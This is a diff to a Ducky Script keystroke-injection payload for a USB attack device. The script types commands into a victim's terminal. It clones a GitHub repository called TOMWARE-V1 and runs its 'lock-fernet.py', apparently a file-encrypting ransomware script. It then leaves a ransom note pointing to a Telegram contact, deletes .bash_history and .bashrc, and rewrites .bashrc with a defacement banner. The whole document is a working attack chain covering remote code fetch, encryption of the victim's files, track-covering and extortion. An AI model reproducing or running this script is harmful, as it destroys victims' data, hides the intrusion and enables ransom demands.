@@ -1,6 +1,174 @@
 DELAY 1000
+STRING figlet -f slant 'TOMCAT26X WAS HERE' | lolcat
+ENTER
+DELAY 800
 STRING git clone https://github.com/tomxpo9/TOMWARE-V1.git
 ENTER
-DELAY 5000
-STRING cd TOMWARE-V1 && pip install -r requirements.txt && python lock-fernet.py && cd .. && mkdir KRYPTON-WAS-HERE && ls
+DELAY 700
+STRING cd TOMWARE-V1 && apt install python3 bash figlet python-cryptography
+ENTER
+DELAY 700
+STRING pip install lolcat
+ENTER
+DELAY 700
+STRING python3 lock-fernet.py
+ENTER
+DELAY 700
+STRING cd
+ENTER
+DELAY 700
+STRING rm -rf TOMWARE-V1
+ENTER
+DELAY 700
+STRING cd
+ENTER
+DELAY 700
+STRING rm -rf TOMCAT26X-Message.txt
+ENTER
+DELAY 300
+STRING cd
+ENTER
+DELAY 700
+STRING nano TOMCAT26X-Message.txt
+ENTER
+DELAY 700
+STRING Your Systems Hasbeen Hacked By TOMCAT26X, Now Trash Your Potato Systems, Contact Telegram GGNTM26X To Repair Your Files.
+CTRL x
+DELAY 700
+STRING y
+DELAY 700
+ENTER
+DELAY 300
+STRING rm -rf .bash_history
+ENTER
+DELAY 300
+STRING rm -rf .bashrc
+ENTER
+STRING clear
+ENTER
+DELAY 300
+STRING nano .bashrc
+ENTER
+DELAY 300
+STRING clear
+ENTER
+DELAY 300
+STRING TOMWARE="""
+ENTER
+DELAY 10
+STRING                         oo.........oo
+ENTER
+DELAY 10
+STRING                      o.................o
+ENTER
+DELAY 10
+STRING                    o.....................o
+ENTER
+DELAY 10
+STRING                   o........................
+ENTER
+DELAY 10
+STRING                  ...........................o
+ENTER
+DELAY 10
+STRING                 .............................
+ENTER
+DELAY 10
+STRING        ooo     o.............................o     ooo
+ENTER
+DELAY 10
+STRING       o....o   o..............................   o....o
+ENTER
+DELAY 10
+STRING       ......o  ...............................  o......
+ENTER
+DELAY 10
+STRING     o......... ...........TOMCAT26X........... o........o
+ENTER
+DELAY 10
+STRING    o..........o....o..........................o..........o
+ENTER
+DELAY 10
+STRING     ..........o...o.......................o...o..........o
+ENTER
+DELAY 10
+STRING     o..........o.o.........................o..o.........o
+ENTER
+DELAY 10
+STRING       ooooo....o.o..o     o.......o     oo...o...ooooooo
+ENTER
+DELAY 10
+STRING                o.o.         o....         ..o o
+ENTER
+DELAY 10
+STRING                  ..         o....         ..o
+ENTER
+DELAY 10
+STRING                 ...         .....o        ...o
+ENTER
+DELAY 10
+STRING                o...o      o..o.o..o      o...o
+ENTER
+DELAY 10
+STRING                 ....ooooo...  o  ....oooo....
+ENTER
+DELAY 10
+STRING                  ...........  .  o..........o
+ENTER
+DELAY 10
+STRING                   o.........  .o o........o
+ENTER
+DELAY 10
+STRING                    o.o  ....oo..o....o o.o
+ENTER
+DELAY 10
+STRING                 o..o..  .............  ..oo.oo
+ENTER
+DELAY 10
+STRING            ooo.....o..ooo...........ooo...o....oooooooo
+ENTER
+DELAY 10
+STRING      ..............o..........o.oo.oo....o..............
+ENTER
+DELAY 10
+STRING     o.............o o.....o.o.o.o.......o o.............o
+ENTER
+DELAY 10
+STRING     o...........o    o......oooo........    o...........o
+ENTER
+DELAY 10
+STRING      o.........o      ........o........       o........o
+ENTER
+DELAY 10
+STRING       o......o        o...............o        o......o
+ENTER
+DELAY 10
+STRING        ....o            o............o           o....o
+ENTER
+DELAY 10
+STRING                          oo.......oo """
+ENTER
+DELAY 100
+STRING echo "$TOMWARE" | lolcat
+ENTER
+DELAY 100
+STRING figlet -f slant 'TOMCAT26X WAS HERE' | lolcat
+ENTER
+DELAY 300
+STRING cat TOMCAT26X-Message.txt
+ENTER
+DELAY 300
+STRING echo
+ENTER
+STRING PROMPT_DIRTRIM=2
+ENTER
+STRING PS1="\033[1;31mCYBERTOM > "
+ENTER
+DELAY 300
+CTRL x
+DELAY 500
+STRING y
+ENTER
+DELAY 100
+STRING bash
 ENTER
